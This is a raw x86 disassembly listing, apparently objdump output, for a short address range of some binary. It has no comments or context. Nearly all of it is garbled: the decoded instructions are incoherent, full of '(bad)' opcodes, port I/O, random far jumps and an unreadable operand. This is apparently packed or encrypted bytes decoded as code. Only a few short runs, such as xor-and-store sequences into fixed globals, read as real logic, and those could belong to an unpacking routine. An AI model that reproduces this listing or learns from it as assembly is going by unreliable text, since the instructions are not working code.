  41161a:	push   ebp
  41161b:	out    dx,al
  41161c:	jle    0x411643
  41161e:	cmp    eax,DWORD PTR [edi+0x4e1fc8c1]
  411624:	aam    0x2b
  411626:	add    ebx,esi
  411628:	stos   BYTE PTR es:[edi],al
  411629:	out    dx,eax
  41162a:	sbb    DWORD PTR [ecx+0x58db6314],0xaf31c02a
  411634:	inc    ebp
  411635:	mov    ah,0x9a
  411637:	js     0x411692
  411639:	into   
  41163a:	stc    
  41163b:	lea    esi,[edi+0x78a2eb5f]
  411641:	in     eax,dx
  411642:	icebp  
  411643:	in     eax,dx
  411644:	pop    ss
  411645:	ret    
  411646:	jb     0x8044bbd3
  41164c:	icebp  
  41164d:	xor    dh,0x55
  411650:	pop    edi
  411651:	ret    0x46ce
  411654:	adc    eax,0xf995bbbb
  411659:	in     eax,0x62
  41165b:	hlt    
  41165c:	dec    ebx
  41165d:	add    DWORD PTR [ebx-0x3dbc0614],0xdef75d2e
  411667:	mov    ebp,0xb3968229
  41166c:	adc    bl,BYTE PTR [ebx-0x298a5cbc]
  411672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411673:	pop    esp
  411674:	mov    dh,dl
  411676:	and    BYTE PTR [ebp-0x3c],ch
  411679:	hlt    
  41167a:	pushf  
  41167b:	adc    ah,BYTE PTR [ecx]
  41167d:	jecxz  0x411658
  41167f:	jmp    0xeae9:0xd455b646
  411686:	lea    esp,ds:0xe96248fe
  41168c:	mov    dh,BYTE PTR [esi]
  41168e:	jle    0x4116fe
  411690:	aas    
  411691:	shr    DWORD PTR [eax],1
  411693:	adc    al,0xd0
  411695:	daa    
  411696:	test   DWORD PTR [ebx-0x3],ebx
  411699:	fadd   DWORD PTR [eax-0x7a8476d2]
  41169f:	mov    esi,0xffb1dc43
  4116a4:	fprem1 
  4116a6:	clc    
  4116a7:	inc    ebx
  4116a8:	shl    BYTE PTR [ebx],1
  4116aa:	ins    DWORD PTR es:[edi],dx
  4116ab:	mov    BYTE PTR [edi],dh
  4116ad:	(bad)  
  4116ae:	or     BYTE PTR [eax+eax*4+0x54],0x6b
  4116b3:	popf   
  4116b4:	std    
  4116b5:	cmp    BYTE PTR [edi],0xe4
  4116b8:	jmp    0x411730
  4116ba:	retf   
  4116bb:	adc    BYTE PTR [edi-0x3fa05e1a],dl
  4116c1:	push   ss
  4116c2:	fcomp  DWORD PTR [edx-0x43]
  4116c5:	scas   al,BYTE PTR es:[edi]
  4116c6:	ficom  WORD PTR [esi+0x54]
  4116c9:	inc    ecx
  4116ca:	loope  0x41167b
  4116cc:	pop    esi
  4116cd:	sbb    ebp,edi
  4116cf:	sbb    DWORD PTR [esi+0x307abd22],0x63
  4116d6:	or     eax,0xfa50eb8b
  4116db:	jmp    0x68c3ac13
  4116e0:	ins    BYTE PTR es:[edi],dx
  4116e1:	scas   eax,DWORD PTR es:[edi]
  4116e2:	(bad)  
  4116e3:	loopne 0x41167f
  4116e5:	and    bh,BYTE PTR [eax+0x53]
  4116e8:	dec    esp
  4116e9:	dec    ecx
  4116ea:	mov    edx,0x6ddd0f49
  4116ef:	mov    ch,0x0
  4116f1:	mov    edi,0xf9ae903c
  4116f6:	retf   0x119c
  4116f9:	sbb    eax,0x23b63e46
  4116fe:	or     al,0x21
  411700:	retf   0x78d4
  411703:	out    dx,al
  411704:	add    ch,BYTE PTR [esp+edi*2]
  411707:	sbb    DWORD PTR [ecx+0x7a],ebp
  41170a:	ret    
  41170b:	scas   al,BYTE PTR es:[edi]
  41170c:	mov    edx,DWORD PTR [eax+0x2e89d241]
  411712:	int    0xac
  411714:	data16 and BYTE PTR [esi-0x65e837aa],bh
  41171b:	pminub mm7,QWORD PTR [edi+ebx*4-0x6530fba6]
  411723:	push   ds
  411724:	jmp    0xf737:0xafa83497
  41172b:	pop    ebx
  41172c:	test   dh,ah
  41172e:	outs   dx,BYTE PTR ds:[esi]
  41172f:	xchg   edx,eax
  411730:	sbb    esp,DWORD PTR [ebx+0x4c5fbb77]
  411736:	sub    cl,dl
  411738:	vdivss xmm7,xmm4,DWORD PTR [esi-0x23]
  41173d:	cmp    ch,BYTE PTR [ecx+0x79f2df29]
  411743:	call   0x6a103ce3
  411748:	mov    al,ds:0x63041896
  41174d:	sbb    esi,eax
  41174f:	jnp    0x4117bb
  411751:	mov    DWORD PTR [edx],ebp
  411753:	push   edx
  411754:	and    sp,0x4c
  411758:	sbb    dl,BYTE PTR ds:0x4848fba9
  41175e:	pop    esp
  41175f:	push   eax
  411760:	jne    0x4117d4
  411762:	out    dx,eax
  411763:	jnp    0x4117b4
  411765:	pop    ebp
  411766:	int3   
  411767:	les    ebx,FWORD PTR [ecx]
  411769:	js     0x4117ad
  41176b:	or     BYTE PTR [eax],al
  41176d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176e:	ins    BYTE PTR es:[edi],dx
  41176f:	mov    edi,0xc00765c6
  411774:	xchg   edx,eax
  411775:	mov    DWORD PTR [edx-0x6c35992b],ecx
  41177b:	adc    DWORD PTR [eax+0x6cd6be85],edx
  411781:	scas   al,BYTE PTR es:[edi]
  411782:	loop   0x411743
  411784:	xchg   esi,eax
  411785:	add    eax,0x13489332
  41178a:	jno    0x41172e
  41178c:	mov    ds:0x9d41f683,al
  411791:	repnz or eax,0x9f307618
  411797:	mov    ah,0x83
  411799:	ret    0x926b
  41179c:	pop    edx
  41179d:	sbb    al,0x92
  41179f:	test   DWORD PTR [ecx-0x74],esp
  4117a2:	out    dx,al
  4117a3:	fs push 0x9c123fef
  4117a9:	nop
  4117aa:	pop    esp
  4117ab:	mov    esi,0xdbd38e5e
  4117b0:	in     al,dx
  4117b1:	mov    eax,ds:0x5f7e2605
  4117b6:	sub    ecx,esp
  4117b8:	gs (bad) 
  4117ba:	out    0xbf,al
  4117bc:	outs   dx,BYTE PTR ds:[esi]
  4117bd:	popf   
  4117be:	sbb    eax,DWORD PTR [edx+0x72786e20]
  4117c4:	pop    eax
  4117c5:	in     eax,0x95
  4117c7:	mov    eax,0x78ed0b7b
  4117cc:	jb     0x4117c5
  4117ce:	ja     0x411793
  4117d0:	xchg   edx,eax
  4117d1:	adc    ch,bh
  4117d3:	int    0x56
  4117d5:	xchg   esi,eax
  4117d6:	stos   DWORD PTR es:[edi],eax
  4117d7:	push   edi
  4117d8:	repz add esi,ecx
  4117db:	jmp    0x120b426b
  4117e0:	push   0x4f
  4117e2:	addr16 or ebp,edx
  4117e5:	aaa    
  4117e6:	fdivr  DWORD PTR [eax-0x1965ebf]
  4117ec:	ret    
  4117ed:	sub    DWORD PTR [edi-0x37],ebp
  4117f0:	sbb    eax,0xf04e70c6
  4117f5:	stc    
  4117f6:	iret   
  4117f7:	lds    ebx,FWORD PTR [edx-0x7cbd320d]
  4117fd:	inc    edx
  4117fe:	push   0xffffffdc
  411800:	pushf  
  411801:	add    edx,ebx
  411803:	imul   DWORD PTR [ecx]
  411805:	js     0x411812
  411807:	mov    eax,0x44c6bc69
  41180c:	loopne 0x4117dc
  41180e:	push   esp
  41180f:	fs jo  0x411814
  411812:	fild   DWORD PTR [esi]
  411814:	xchg   ecx,eax
  411815:	aam    0x12
  411817:	sti    
  411818:	xlat   BYTE PTR ds:[ebx]
  411819:	fnstsw ax
  41181b:	(bad)  
  41181c:	push   0xfffffff0
  41181e:	sub    eax,0xeb71bf38
  411823:	or     al,0x62
  411825:	fimul  DWORD PTR [eax+eax*2+0x14dffda0]
  41182c:	cmp    eax,0xdd93c0b5
  411831:	jo     0x4117d1
  411833:	adc    cl,BYTE PTR [eax+0x53]
  411836:	(bad)  
  411837:	je     0x4117da
  411839:	scas   al,BYTE PTR es:[edi]
  41183a:	icebp  
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x775522e9],dl
  41187c:	cmp    eax,0x70705776
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x41185d
  411886:	dec    esp
  411887:	daa    
  411888:	xor    ah,BYTE PTR [ecx+0x62]
  41188b:	xchg   ch,dl
  41188d:	jl     0x411885
  41188f:	aas    
  411890:	imul   ebx,ebp,0xffffffc0
  411893:	cs (bad) 
  411895:	scas   al,BYTE PTR es:[edi]
  411896:	push   es
  411897:	imul   ebp,esi,0x61
  41189a:	or     ecx,DWORD PTR [ecx]
  41189c:	jbe    0x4118e2
  41189e:	xor    eax,0xacf81fec
  4118a3:	loop   0x411829
  4118a5:	ss in  al,0xd2
  4118a8:	(bad)  
  4118a9:	and    ah,BYTE PTR [esi]
  4118ab:	inc    esi
  4118ac:	dec    ebp
  4118ad:	out    0x30,eax
  4118af:	lds    eax,FWORD PTR [edi]
  4118b1:	xchg   esi,eax
  4118b2:	jg     0x4118d7
  4118b4:	nop
  4118b5:	ds xor al,0x8f
  4118b8:	js     0x411893
  4118ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bb:	mov    bl,0x49
  4118bd:	or     BYTE PTR [ecx-0x4c],0x81
  4118c1:	push   ebx
  4118c2:	fdiv   st(4),st
  4118c4:	mov    cl,0x39
  4118c6:	int3   
  4118c7:	mov    esi,0xdee50a1a
  4118cc:	inc    eax
  4118cd:	dec    ebx
  4118ce:	adc    BYTE PTR [edi+0x3a],ah
  4118d1:	stc    
  4118d2:	pushf  
  4118d3:	push   ss
  4118d4:	sub    BYTE PTR ds:0x86d516c7,dh
  4118da:	dec    ecx
  4118db:	dec    ebp
  4118dc:	loop   0x411882
  4118de:	and    BYTE PTR [ebx+eiz*2+0x21],dh
  4118e2:	(bad)  
  4118e3:	pop    ebx
  4118e4:	(bad)  
  4118e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e6:	icebp  
  4118e7:	dec    ebx
  4118e8:	repz hlt 
  4118ea:	dec    esi
  4118eb:	cmp    edi,0xb2821cfb
  4118f1:	data16 mov cl,0xb
  4118f4:	xlat   BYTE PTR ds:[ebx]
  4118f5:	or     al,0x57
  4118f7:	mov    eax,ebp
  4118f9:	js     0x411931
  4118fb:	cmp    edx,ecx
  4118fd:	test   DWORD PTR [ebp-0x6f],eax
  411900:	xor    bl,bl
  411902:	add    BYTE PTR [ebp+0x2427cd93],ah
  411908:	dec    eax
  411909:	les    eax,FWORD PTR [ebx-0x2382848d]
  41190f:	mov    bl,0xc1
  411911:	fcmovb st,st(6)
  411913:	inc    edx
  411914:	add    DWORD PTR [edi-0x638c6f00],edi
  41191a:	retf   
  41191b:	popa   
  41191c:	in     al,0x68
  41191e:	inc    esp
  41191f:	scas   eax,DWORD PTR es:[edi]
  411920:	mov    esp,0x1ae24a2
  411925:	fstp   TBYTE PTR [edi+0x1]
  411928:	push   ebp
  411929:	(bad)  
  41192a:	hlt    
  41192b:	fsubr  QWORD PTR [ecx]
  41192d:	mov    esp,0xc6eada49
  411932:	inc    edi
  411933:	push   0xffffffc9
  411935:	cdq    
  411936:	mov    ebx,0xe6fe7a57
  41193b:	xchg   ebp,eax
  41193c:	leave  
  41193d:	div    DWORD PTR [ebp+0x31c07df9]
  411943:	ja     0x411909
  411945:	cmp    ecx,ecx
  411947:	scas   al,BYTE PTR es:[edi]
  411948:	(bad)  
  411949:	fisub  WORD PTR ds:0xf737de47
  41194f:	adc    ecx,DWORD PTR [edx+edi*4-0xe]
  411953:	loop   0x41192f
  411955:	fwait
  411956:	test   BYTE PTR [eax],ch
  411958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411959:	or     BYTE PTR [eax+0x4b],ch
  41195c:	xor    ebp,DWORD PTR [edx+0x39]
  41195f:	jge    0x41199c
  411961:	shr    BYTE PTR [ecx-0x377d1b0c],cl
  411967:	stc    
  411968:	dec    esi
  411969:	ja     0x411989
  41196b:	mov    bl,BYTE PTR [edi-0x3d]
  41196e:	or     BYTE PTR [ecx+0x66],0x9a
  411972:	scas   ax,WORD PTR es:[edi]
  411974:	in     eax,0xc7
  411976:	cdq    
  411977:	adc    BYTE PTR [ecx],bl
  411979:	ja     0x4119d4
  41197b:	call   0x369a9e0
  411980:	mov    esi,0x512a6e0
  411985:	mov    edi,0x5c38ff24
  41198a:	sbb    BYTE PTR [edx],al
  41198c:	xchg   edi,eax
  41198d:	dec    eax
  41198e:	cmp    dh,BYTE PTR [esi+0x6137bdf1]
  411994:	jmp    0x7726e4ae
  411999:	push   edi
  41199a:	aaa    
  41199b:	sar    DWORD PTR [esi],1
  41199d:	jmp    0x3bd5:0xb23bd98c
  4119a4:	push   cs
  4119a5:	sub    BYTE PTR [ecx+0x6],al
  4119a8:	(bad)  
  4119a9:	mov    ebx,0xf1b91bdb
  4119ae:	adc    dl,bl
  4119b0:	test   ecx,esi
  4119b2:	mov    ds:0x7c463bef,al
  4119b7:	dec    ebp
  4119b8:	push   ds
  4119b9:	inc    eax
  4119ba:	lods   eax,DWORD PTR ds:[esi]
  4119bb:	push   edx
  4119bc:	call   0xf5e1:0xc56c
  4119c2:	push   edi
  4119c3:	or     ebp,DWORD PTR [esi+edx*4+0x48034728]
  4119ca:	sub    dl,BYTE PTR [esi]
  4119cc:	lods   eax,DWORD PTR ds:[esi]
  4119cd:	cmp    DWORD PTR [ebx+0xcc8f8fa],eax
  4119d3:	push   es
  4119d4:	fidivr WORD PTR [eax+0x72efbbb6]
  4119da:	sbb    edx,DWORD PTR [edi-0x63803d4]
  4119e0:	mov    BYTE PTR [ebx+0x1e91cc1c],dl
  4119e6:	mov    ebx,0x5db4a50a
  4119eb:	adc    al,0x92
  4119ed:	jb     0x4119ab
  4119ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f0:	data16 fldcw WORD PTR [esi+0x36]
  4119f4:	mov    esp,0xa6e50a64
  4119f9:	enter  0xb0c4,0xf9
  4119fd:	retf   
  4119fe:	push   ss
  4119ff:	jb     0x411a51
  411a01:	cmp    al,al
  411a03:	adc    al,0xca
  411a05:	pop    ebp
  411a06:	pop    es
  411a07:	ja     0x411a1e
  411a09:	in     eax,dx
  411a0a:	aaa    
  411a0b:	jecxz  0x411991
  411a0d:	cmp    BYTE PTR [ecx-0x58d589ca],dl
  411a13:	ucomiss xmm2,DWORD PTR [ebx]
  411a16:	push   cs
  411a17:	sbb    al,0x45
  411a19:	add    bh,BYTE PTR [ebx+eax*4+0x7f]
  411a1d:	adc    al,0x7c
  411a1f:	xchg   DWORD PTR [ecx-0x5863795b],edx
  411a25:	or     esi,DWORD PTR [ebx-0x729d1dfc]
  411a2b:	(bad)  
  411a2c:	leave  
  411a2d:	les    ebp,FWORD PTR [ebx+0x7a08257a]
  411a33:	pop    es
  411a34:	sub    edx,DWORD PTR [ecx-0x2c]
  411a37:	sahf   
  411a38:	sbb    DWORD PTR [ebp-0x4ade7d24],edx
  411a3e:	xchg   ebp,eax
  411a3f:	pop    eax
  411a40:	in     eax,dx
  411a41:	bound  edi,QWORD PTR [esi+0x9]
  411a44:	gs clc 
  411a46:	cdq    
  411a47:	lock and ch,BYTE PTR [esi-0x14ce121b]
  411a4e:	xor    eax,0x969e7545
  411a53:	addr16 es nop
  411a56:	jg     0x411a63
  411a58:	fwait
  411a59:	int3   
  411a5a:	sub    BYTE PTR [ebx+0x68cc9042],bl
  411a60:	push   edi
  411a61:	mov    esi,0xba0e405
  411a66:	dec    bx
  411a68:	loopne 0x411a80
  411a6a:	test   eax,0x5f16f2d6
  411a70:	pusha  
  411a71:	imul   eax,DWORD PTR [edi+0x75],0xfffffff9
  411a75:	popa   
  411a76:	sub    DWORD PTR [edx+0x29],edx
  411a79:	icebp  
  411a7a:	sbb    DWORD PTR [edi],edx
  411a7c:	xchg   ebx,eax
  411a7d:	adc    eax,eax
  411a7f:	(bad)  
  411a80:	nop
  411a81:	sbb    DWORD PTR [edi+0xc],esp
  411a84:	(bad)  
  411a85:	pushf  
  411a86:	mov    edx,0x67d5d308
  411a8b:	push   eax
  411a8c:	pop    edx
  411a8d:	dec    ebp
  411a8e:	stos   BYTE PTR es:[edi],al
  411a8f:	mov    ah,0x61
  411a91:	aaa    
  411a92:	(bad)  
  411a93:	mov    WORD PTR [ecx],ss
  411a95:	sub    DWORD PTR [edi+0x112a248e],edi
  411a9b:	stos   DWORD PTR es:[edi],eax
  411a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a9d:	pop    ebx
  411a9e:	or     DWORD PTR [eax],0x35
  411aa1:	pop    es
  411aa2:	(bad)  
  411aa3:	jmp    0x411ac8
  411aa5:	add    BYTE PTR [esi],cl
  411aa7:	dec    ecx
  411aa8:	push   ebp
  411aa9:	scas   al,BYTE PTR es:[edi]
  411aaa:	mov    ebx,0x75274431
  411aaf:	rcr    BYTE PTR [ebx+eiz*1],cl
  411ab2:	push   cs
  411ab3:	popa   
  411ab4:	sub    DWORD PTR [ebp-0x1f8e9407],ebp
  411aba:	dec    edx
  411abb:	dec    ecx
  411abc:	xor    dh,BYTE PTR [edi+0x16deed38]
  411ac2:	jbe    0x411a67
  411ac4:	lods   al,BYTE PTR ds:[esi]
  411ac5:	es sub dh,dh
  411ac8:	and    BYTE PTR ds:0xc5717536,0x70
  411acf:	cmc    
  411ad0:	push   ebp
  411ad1:	loope  0x411a7e
  411ad3:	fucomip st,st(5)
  411ad5:	or     al,0x1a
  411ad7:	xchg   ebp,eax
  411ad8:	or     dh,BYTE PTR [ecx+0x4274e0ac]
  411ade:	xlat   BYTE PTR ds:[ebx]
  411adf:	and    eax,0x614ac7ef
  411ae4:	ss aad 0x92
  411ae7:	out    0xa4,al
  411ae9:	aad    0x73
  411aeb:	(bad)  
  411aec:	shl    BYTE PTR [edx-0x1d4492d0],0xec
  411af3:	push   ss
  411af4:	es jnp 0x411b1b
  411af7:	cmp    esi,ebx
  411af9:	aas    
  411afa:	not    BYTE PTR [edx+0x5e]
  411afd:	scas   al,BYTE PTR es:[edi]
  411afe:	cmp    DWORD PTR [edi],0x804aa6ab
  411b04:	add    cl,BYTE PTR [ebx-0x49fd3a58]
  411b0a:	cmp    DWORD PTR [edx],ecx
  411b0c:	hlt    
  411b0d:	je     0x411b14
  411b0f:	clc    
  411b10:	dec    edi
  411b11:	(bad)  
  411b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b13:	push   esp
  411b14:	push   edx
  411b15:	mov    edx,0x5a49c444
  411b1a:	push   ds
  411b1b:	sub    al,0x51
  411b1d:	cmp    BYTE PTR [ebp-0x6911b27f],dh
  411b23:	call   0x8b1a9f9c
  411b28:	and    al,0xaf
  411b2a:	hlt    
  411b2b:	sub    DWORD PTR [edx+0xfaa8f04],ecx
  411b31:	mov    ?,esp
  411b33:	sbb    al,0xf0
  411b35:	cmc    
  411b36:	test   DWORD PTR [ebp+0x2bf8bddb],esi
  411b3c:	adc    dl,dl
  411b3e:	pop    ss
  411b3f:	cdq    
  411b40:	dec    eax
  411b41:	xchg   esp,eax
  411b42:	jp     0x411bac
  411b44:	xor    BYTE PTR [edx-0x18b8eb53],ah
  411b4a:	sub    ebp,DWORD PTR [ebp-0x3defcd13]
  411b50:	ins    DWORD PTR es:[edi],dx
  411b51:	cwde   
  411b52:	je     0x411b8c
  411b54:	xor    DWORD PTR [edx+0x2a0711e6],ecx
  411b5a:	xor    bh,BYTE PTR [ebx-0x1d]
  411b5d:	data16 sbb al,0x10
  411b60:	or     al,0x67
  411b62:	ja     0x411afd
  411b64:	je     0x411bd7
  411b66:	jmp    0x411b14
  411b68:	ins    BYTE PTR es:[edi],dx
  411b69:	test   DWORD PTR [ecx],0xbe70009f
  411b6f:	jmp    0xfbcc:0xfaa6b401
  411b76:	pop    edi
  411b77:	loop   0x411b0a
  411b79:	mov    al,ds:0x3f1b524e
  411b7e:	push   cs
  411b7f:	or     eax,0xecb3762a
  411b84:	push   0x7e
  411b86:	sar    BYTE PTR [edx-0x4b],1
  411b89:	jns    0x411bcd
  411b8b:	cmp    edx,DWORD PTR [edi+0x60]
  411b8e:	fadd   QWORD PTR [ecx]
  411b90:	(bad)  
  411b91:	repnz test eax,0x34c08515
  411b97:	cmovb  ebp,DWORD PTR [edi-0x23]
  411b9b:	xor    al,0xbd
  411b9d:	or     al,0x49
  411ba0:	leave  
  411ba1:	jmp    0xd720:0x289dabed
  411ba8:	mov    edi,0x3475f859
  411bad:	test   DWORD PTR [ebp+0x2e],edx
  411bb0:	bound  esp,QWORD PTR [edx]
  411bb2:	lods   eax,DWORD PTR ds:[esi]
  411bb3:	(bad)  
  411bb4:	fwait
  411bb5:	std    
  411bb6:	add    ebp,DWORD PTR [ebx-0x78]
  411bb9:	(bad)  
  411bba:	int    0xa1
  411bbc:	cmp    DWORD PTR [edx+0x35a189b4],0xffffff80
  411bc3:	sub    eax,0x14509438
  411bc8:	test   eax,0x2883b60a
  411bcd:	inc    eax
  411bce:	pop    ss
  411bcf:	int3   
  411bd0:	push   edi
  411bd1:	arpl   cx,ax
  411bd3:	jl     0x411b84
  411bd5:	cmp    ebp,DWORD PTR [edx]
  411bd7:	inc    eax
  411bd8:	dec    ebp
  411bd9:	out    dx,al
  411bda:	aaa    
  411bdb:	xchg   edi,eax
  411bdc:	loope  0x411bf8
  411bde:	add    DWORD PTR [esi+0x469c3910],edx
  411be4:	pop    edx
  411be5:	loop   0x411b6e
  411be7:	shl    DWORD PTR [esi],cl
  411be9:	push   0xffffff84
  411beb:	mov    bh,0xdf
  411bed:	ret    
  411bee:	ins    BYTE PTR es:[edi],dx
  411bef:	mov    edi,0x585b7a6a
  411bf4:	(bad)  
  411bf5:	loop   0x411bb3
  411bf7:	push   esi
  411bf8:	retf   
  411bf9:	xor    al,al
  411bfb:	mov    bh,0xc4
  411bfd:	shl    DWORD PTR [edi+0x71e6bbf8],1
  411c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c05:	mov    bh,0x23
  411c07:	mov    ecx,0x13e69c87
  411c0c:	mov    eax,edi
  411c0e:	out    0xa0,al
  411c10:	call   0x37764f8e
  411c15:	jo     0x411c4b
  411c17:	jecxz  0x411c56
  411c19:	aad    0xe6
  411c1b:	xor    DWORD PTR [ecx+0x190ea3eb],ebx
  411c21:	jmp    esp
  411c23:	pop    es
  411c24:	jbe    0x411c7f
  411c26:	shl    BYTE PTR [edx],0x81
  411c29:	fsub   QWORD PTR [ebp+eiz*2-0x3d]
  411c2d:	mov    bl,0x71
  411c2f:	test   DWORD PTR gs:[esi+0x2b],edi
  411c33:	xchg   ebx,eax
  411c34:	loopne 0x411bde
  411c36:	in     al,0x5f
  411c38:	pop    edi
  411c39:	int    0xea
  411c3b:	mov    bh,0xd
  411c3d:	push   ebx
  411c3e:	jne    0x411be9
  411c40:	shl    BYTE PTR [ebp+0x3e],cl
  411c43:	add    BYTE PTR [ebp+0x3a],bh
  411c46:	or     cl,dl
  411c48:	ficomp WORD PTR [esi+0x30]
  411c4b:	push   0xffffffab
  411c4d:	mov    eax,0x13b9e86e
  411c52:	loop   0x411c15
  411c54:	mov    ds:0xd931d58a,al
  411c59:	popf   
  411c5a:	push   0xfabccb0a
  411c5f:	adc    DWORD PTR [esi],ebx
  411c61:	xchg   ebx,eax
  411c62:	fs inc ebx
  411c64:	fiadd  WORD PTR [edi-0x14f7158d]
  411c6a:	jecxz  0x411c8a
  411c6c:	add    al,0xa1
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xc90f3d5e
  411cb8:	sbb    DWORD PTR [esi+0x53],ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411ca6
  411cc2:	cli    
  411cc3:	sbb    al,0x86
  411cc5:	mov    eax,ds:0x760de8b0
  411cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ccb:	xor    eax,edx
  411ccd:	jmp    0x411cb8
  411ccf:	sub    DWORD PTR [eax],edx
  411cd1:	fdivr  st,st(0)
  411cd3:	call   0x1a0b356
  411cd8:	sub    bh,BYTE PTR [edi+0x38]
  411cdb:	cmp    eax,0x5d8d001a
  411ce0:	call   0x6c5040a9
  411ce5:	repnz cs das 
  411ce8:	or     DWORD PTR [ecx+0x1e],ebx
  411ceb:	cmp    bh,BYTE PTR [edx]
  411ced:	icebp  
  411cee:	jbe    0x411d67
  411cf0:	test   dl,bh
  411cf2:	aas    
  411cf3:	fsub   DWORD PTR [esi]
  411cf5:	scas   eax,DWORD PTR es:[edi]
  411cf6:	gs jp  0x411ca9
  411cf9:	pushf  
  411cfa:	pop    edi
  411cfb:	jno    0x411c96
  411cfd:	inc    ecx
  411cfe:	jno    0x411cf9
  411d00:	leave  
  411d01:	test   BYTE PTR [esi-0x63],al
  411d04:	out    0x46,al
  411d06:	lock push es
  411d08:	lea    ebx,[esi+0x6609a426]
  411d0e:	out    0x5b,al
  411d10:	inc    ebp
  411d11:	inc    ebp
  411d12:	aad    0x15
  411d14:	es dec esi
  411d16:	in     al,dx
  411d17:	inc    edx
  411d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d19:	mov    eax,fs
  411d1b:	xor    eax,0x562512f0
  411d20:	xchg   esi,eax
  411d21:	mov    ebp,DWORD PTR [edi-0x7aa3fb2]
  411d27:	ds jnp 0x411cee
  411d2a:	cmp    bh,bl
  411d2c:	jb     0x411dab
  411d2e:	test   BYTE PTR [edi+0x1bbe21f6],dh
  411d34:	inc    esp
  411d35:	jnp    0x411d4f
  411d37:	shl    WORD PTR [ebp-0x4d],cl
  411d3b:	pop    edi
  411d3c:	ret    
  411d3d:	scas   eax,DWORD PTR es:[edi]
  411d3e:	in     eax,0x69
  411d40:	adc    al,0xbc
  411d42:	adc    al,0x59
  411d44:	inc    ebx
  411d45:	push   0xfffffffb
  411d47:	xlat   BYTE PTR ds:[ebx]
  411d48:	fimul  WORD PTR [edx-0x5]
  411d4b:	(bad)  
  411d4c:	jbe    0x411d15
  411d4e:	jbe    0x411d10
  411d50:	pop    ecx
  411d51:	sub    esp,ecx
  411d53:	mov    ebx,0xa5cde8ec
  411d58:	test   eax,0x26662c5d
  411d5d:	icebp  
  411d5e:	out    dx,eax
  411d5f:	jle    0x411dc2
  411d61:	iret   
  411d62:	out    0x22,eax
  411d64:	cs movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  411d67:	ret    
  411d68:	inc    edi
  411d69:	pand   mm7,QWORD PTR ds:0xbc458bca
  411d70:	repz xchg ecx,eax
  411d72:	les    ecx,FWORD PTR [ecx+ecx*8]
  411d75:	and    bl,BYTE PTR [esi+0x60b42a4a]
  411d7b:	mov    ebp,0x15d2bed9
  411d80:	cmp    ch,BYTE PTR [ebp-0x6b86402b]
  411d86:	cwde   
  411d87:	or     eax,0x14a664e6
  411d8c:	(bad)  
  411d8d:	fistp  WORD PTR [eax-0x6c]
  411d90:	loop   0x411deb
  411d92:	mov    ebx,0x223b24dc
  411d97:	in     al,0xe3
  411d99:	add    eax,0x966b0137
  411d9e:	xlat   BYTE PTR ds:[ebx]
  411d9f:	inc    edx
  411da0:	adc    BYTE PTR [eax],bh
  411da2:	mov    al,ds:0x1f538da
  411da7:	scas   eax,DWORD PTR es:[edi]
  411da8:	jo     0x411da1
  411daa:	dec    ebx
  411dab:	inc    esi
  411dac:	les    esi,FWORD PTR [eax+0x59]
  411daf:	ja     0x411d60
  411db1:	repnz sbb al,0x9c
  411db4:	inc    eax
  411db5:	cli    
  411db6:	jb     0x411da1
  411db8:	mov    cl,0x41
  411dba:	fwait
  411dbb:	sbb    esp,DWORD PTR [eax-0x2f]
  411dbe:	in     eax,dx
  411dbf:	inc    ebx
  411dc0:	test   bl,0x5
  411dc3:	mov    edi,0xb22aab8
  411dc8:	xchg   edi,eax
  411dc9:	cmp    BYTE PTR [esp+esi*8-0x13b3d34e],ch
  411dd0:	mov    ds:0x88d6a4b1,eax
  411dd5:	out    0xa,eax
  411dd7:	lods   al,BYTE PTR ds:[esi]
  411dd8:	lock stos BYTE PTR es:[edi],al
  411dda:	inc    ebp
  411ddb:	fadd   st,st(6)
  411ddd:	scas   eax,DWORD PTR es:[edi]
  411dde:	jmp    0xc04c2114
  411de3:	mov    edi,0xd06783a8
  411de8:	jmp    0x411e39
  411dea:	in     eax,0x41
  411dec:	mov    eax,ds:0x3ef19db
  411df1:	sar    BYTE PTR fs:[ebp-0x3e658e3],0xea
  411df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dfa:	sub    eax,0xf8709446
